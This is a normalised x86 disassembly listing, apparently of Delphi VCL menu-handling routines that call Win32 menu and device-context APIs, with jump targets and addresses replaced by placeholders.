pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_44f898
mov eax ebx
call sub_408494
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44f39c
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44f2fc
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4041cc
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40441c
lea edx [ ebp - 0x200 ]
call sub_408584
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44f430
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_44f4a0
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44f940
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44f940
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44f940
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44f4ac
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44f39c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44f430
mov eax ebx
call sub_44f964
jmp r-xdata
sub_44f514
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44f55c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44978c
mov eax ebx
call sub_44ed70
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_4497d0
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_4194c0
sub_44f598
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41970c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_44f55c
sub_44f5dc
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44ee20
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_44ee20
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_452910
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_44f638
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_44f70d
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44ee20
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44ee20
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44d9cc
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404144
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404144
mov eax [ ebp - 0xc ]
pop edx
call sub_407bbc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_450484
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f714
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f80
retn
sub_44f720
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44f5dc
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44f638
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_44f898
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44efa4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_44ee20
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_44ee20
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408564
mov eax [ ebp + 0x10 ]
call sub_40847c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44f964
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_438aac
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44f940
mov [ ebx + 0x41 ] 0x1
sub_44f98c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44f940
mov [ ebx + 0x41 ] 0x1
sub_44fa18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44f514
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44f39c
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_44faa8
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44fae4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fb0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fb30
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450063
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45006a
lea eax [ ebp - 0x30 ]
call sub_403f5c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ esi + 0x4 ]
call sub_44eedc
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45bf20
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov dx [ esi + 0x4 ]
call sub_44eec0
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44fe96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44fe79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41d5b0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d450
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe80
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d5b0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44f720
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_44ee20
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44ee20
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_44ffd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ffb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44ff97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41d5b0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d450
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff9e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d5b0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_438d30
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf20
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44ee20
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_44ee20
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_44ee20
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_44ee50
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_44ee50
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45bbc4
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45bc2c
jmp r-xdata
sub_44ffbb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_450074
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4137bc
pop esi
pop ebx
retn
push ebx
push sub_44fae4
call sub_41a53c
mov [ ebx + 0x10 ] eax
sub_4500b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ec38
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_450074
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_45012c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45009c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ecd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_450184
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44afd0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44f940
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44f940
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_4501cc
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44afd0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a770
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403420
mov edx eax
jmp r-xdata
sub_450218
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_4124bc
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_450184
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44e58c
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44ea88
mov eax [ ebx + 0x34 ]
call sub_44be30
mov eax ebx
call sub_44f430
mov eax ebx
call sub_4501cc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44bf60
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4502cc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413918
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413918
cmp ebp [ eax ]
jne r-xdata
sub_450308
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41cc90
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41c4c4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41cc90
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41c4c4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403420
mov edx [ r-xdata ]
call sub_4033b0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41cc90
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41c4c4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4503f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403fb0
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40421c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044bc
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40421c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044bc
jmp r-xdata
sub_450484
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f5c
mov ebx 0x1
mov eax esi
call sub_40421c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404144
sub_4504e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_450541
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4503f0
mov eax [ ebp - 0x4 ]
push eax
